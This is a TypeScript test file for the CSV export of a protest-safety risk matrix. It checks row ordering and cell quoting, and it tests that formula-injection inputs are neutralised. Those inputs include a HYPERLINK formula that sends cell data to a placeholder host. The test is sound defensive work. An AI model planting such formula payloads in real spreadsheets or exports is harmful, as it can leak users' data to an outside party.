import { describe, expect, it } from "vitest";
import { buildMatrixCsv, escapeCsvField, MATRIX_CSV_HEADERS } from "./matrixCsv";
import { emptyGrid } from "./riskMatrixUtils";

/** Minimal RFC 4180 reader, enough to check what a spreadsheet would see. */
function parseCsv(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i];
    if (quoted) {
      if (c === '"' && csv[i + 1] === '"') {
        field += '"';
        i++;
      } else if (c === '"') {
        quoted = false;
      } else {
        field += c;
      }
    } else if (c === '"') {
      quoted = true;
    } else if (c === ",") {
      row.push(field);
      field = "";
    } else if (c === "\r" && csv[i + 1] === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      i++;
    } else {
      field += c;
    }
  }
  return rows;
}

function sampleGrid() {
  const grid = emptyGrid();
  // Medium likelihood, high impact: orange.
  grid["1-2"] = [
    {
      id: "a",
      text: "Phone seized at protest",
      reduce: [
        { id: "a1", text: "Leave phone at home", starred: true },
        { id: "a2", text: "", starred: false },
      ],
      prepare: [{ id: "a3", text: "Full-disk encryption", starred: false }],
    },
  ];
  // High likelihood, high impact: red. Listed first despite being added second.
  grid["0-2"] = [{ id: "b", text: "Doxxing", reduce: [], prepare: [] }];
  grid["2-0"] = [{ id: "c", text: "   ", reduce: [], prepare: [] }];
  return grid;
}

describe("buildMatrixCsv", () => {
  it("writes one row per mitigation, highest risk first, then pool and other actions", () => {
    const csv = buildMatrixCsv({
      pool: [
        { id: "p1", text: "Infiltrator" },
        { id: "p2", text: "" },
      ],
      grid: sampleGrid(),
      otherActions: [
        { id: "o1", text: "Set up a phone tree" },
        { id: "o2", text: " " },
      ],
    });
    expect(csv.startsWith("﻿")).toBe(true);
    expect(parseCsv(csv.slice(1))).toEqual([
      [...MATRIX_CSV_HEADERS],
      ["Highest risk", "High", "High", "Doxxing", "", "", ""],
      [
        "High risk",
        "Medium",
        "High",
        "Phone seized at protest",
        "Reduction",
        "Leave phone at home",
        "Yes",
      ],
      [
        "High risk",
        "Medium",
        "High",
        "Phone seized at protest",
        "Preparation",
        "Full-disk encryption",
        "",
      ],
      ["Not yet placed", "", "", "Infiltrator", "", "", ""],
      ["", "", "", "", "Other action", "Set up a phone tree", "Yes"],
    ]);
  });

  it("writes only the header for an empty matrix", () => {
    const csv = buildMatrixCsv({ pool: [], grid: emptyGrid(), otherActions: [] });
    expect(parseCsv(csv.slice(1))).toEqual([[...MATRIX_CSV_HEADERS]]);
  });

  it("keeps commas, quotes and newlines inside one cell", () => {
    const grid = emptyGrid();
    grid["1-1"] = [
      { id: "x", text: 'Police "kettle", then\nmass arrest', reduce: [], prepare: [] },
    ];
    const rows = parseCsv(
      buildMatrixCsv({ pool: [], grid, otherActions: [] }).slice(1),
    );
    expect(rows[1][3]).toBe('Police "kettle", then\nmass arrest');
  });
});

describe("escapeCsvField", () => {
  it("neutralizes text a spreadsheet would run as a formula", () => {
    for (const evil of [
      '=HYPERLINK("https://example.invalid/?"&A1)',
      "+1+1",
      "-2+3",
      "@SUM(A1)",
      "\t=1",
      "\r=1",
    ]) {
      const escaped = escapeCsvField(evil);
      const cell = escaped.startsWith('"')
        ? escaped.slice(1, -1).replace(/""/g, '"')
        : escaped;
      expect(cell.startsWith("'")).toBe(true);
    }
  });

  it("leaves ordinary text alone", () => {
    expect(escapeCsvField("Doxxing")).toBe("Doxxing");
    expect(escapeCsvField("")).toBe("");
  });
});
